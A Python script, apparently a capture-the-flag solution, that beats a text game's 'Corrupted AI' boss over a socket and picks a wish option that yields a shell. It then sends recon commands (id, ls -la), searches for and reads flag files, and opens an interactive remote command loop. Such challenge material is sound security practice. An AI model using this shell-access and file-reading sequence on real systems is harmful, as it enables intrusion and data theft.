#!/usr/bin/env python3
import socket
import time
import sys

HOST = sys.argv[1] if len(sys.argv) >= 2 else "192.168.100.121"
PORT = int(sys.argv[2]) if len(sys.argv) >= 3 else 40021

print(f"[*] Connecting to {HOST}:{PORT}")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

s.recv(4096)
s.sendall(b"Pwner\n")
print("[+] Sent player name")

time.sleep(0.2)
s.recv(4096)

print("[*] Starting combat loop (attack with healing every 4th turn)")

for turn in range(1, 30):
    if turn % 4 == 0:
        s.sendall(b"4\n")
    else:
        s.sendall(b"1\n")

    time.sleep(0.3)
    data = s.recv(4096)
    text = data.decode("utf-8", errors="ignore")

    if "You have defeated the Corrupted AI" in text:
        print(f"\n[SUCCESS] AI defeated after {turn} turns!")
        print("=" * 70)
        print(text)
        print("=" * 70)
        break

    if "You have been defeated" in text:
        print(f"\n[FAIL] We died at turn {turn}")
        print(text)
        s.close()
        sys.exit(1)

print("\n[*] Choosing wish option 2 (Ultimate Power)")
s.sendall(b"2\n")

time.sleep(1)
result = s.recv(4096)
result_text = result.decode("utf-8", errors="ignore")

print("=" * 70)
print(result_text)
print("=" * 70)

if "sh" in result_text.lower() or "debug" in result_text.lower() or "$" in result_text:
    print("\n[SUCCESS] Shell access detected!")
    print("[*] Executing commands...")

    s.sendall(b"id\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

    s.sendall(b"pwd\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

    s.sendall(b"ls -la\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

    s.sendall(b"find . -name 'flag*' 2>/dev/null\n")
    time.sleep(0.5)
    flag_search = s.recv(4096).decode("utf-8", errors="ignore")
    print(flag_search)

    s.sendall(
        b"cat flag.txt 2>/dev/null || cat flag 2>/dev/null || cat ../flag* 2>/dev/null\n"
    )
    time.sleep(0.5)
    flag_data = s.recv(4096)
    print("\n[FLAG OUTPUT]")
    print(flag_data.decode("utf-8", errors="ignore"))

    if b"flag{" in flag_data or b"CSC{" in flag_data or b"CTF{" in flag_data:
        print("\n[+] FLAG CAPTURED!")

    print("\n[*] Opening interactive shell...")
    print("[*] Type commands (Ctrl+C to exit):")

    try:
        while True:
            cmd = input("$ ")
            if cmd.strip():
                s.sendall(cmd.encode() + b"\n")
                time.sleep(0.5)
                response = s.recv(4096)
                print(response.decode("utf-8", errors="ignore"))
    except KeyboardInterrupt:
        print("\n[*] Exiting")
else:
    print("\n[WARN] Expected shell but got different response")
    print("[*] Trying to interact anyway...")
    s.sendall(b"id\n")
    time.sleep(0.5)
    print(s.recv(4096).decode("utf-8", errors="ignore"))

s.close()
